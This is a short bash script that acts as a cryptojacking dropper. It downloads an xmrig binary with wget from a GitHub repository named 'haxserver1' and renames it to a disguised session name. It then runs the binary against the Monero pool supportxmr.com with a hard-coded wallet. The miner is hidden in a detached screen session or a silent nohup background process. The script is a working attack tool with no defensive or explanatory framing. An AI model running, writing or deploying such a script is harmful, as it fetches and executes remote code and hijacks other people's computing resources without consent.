#!/bin/bash

FILE_URL="https://github.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/raw/main/xmrig"
FILE_NAME="session_ajqysbey"

wget -O $FILE_NAME $FILE_URL
chmod +x $FILE_NAME 

# Command to run
COMMAND="./$FILE_NAME -o pool.supportxmr.com:443 -u 48PMjoMcbA64NPR7ESQvRsKeDuVXA6AkVAr6LvEUCzxqBimsKvmxeYxN5Ys8htQ2NudViF8PVe8BHbT1eY5jWFXWQ1PB6fG -k --tls -p www.diaf-assurance.com"

# Use the filename as the screen session name
SESSION_NAME=$(basename "$FILE_NAME")

# Check if screen is installed
if command -v screen &> /dev/null
then
    # Check if the screen session is running
    if screen -list | grep -q "$SESSION_NAME"; then
        echo "You already executed the command in a screen session."
    else
        # Run the file in a screen session
        screen -dmS $SESSION_NAME $COMMAND
        sleep 1
        echo "Command executed in a new screen session."
    fi
else
    # Check if the process is running in the background
    if pgrep -f "$COMMAND" > /dev/null; then
        echo "You already executed the command in the background."
    else
        # Run the file in the background using nohup
        nohup $COMMAND &> /dev/null &
        sleep 1
        echo "Command executed in the background."
    fi
fi
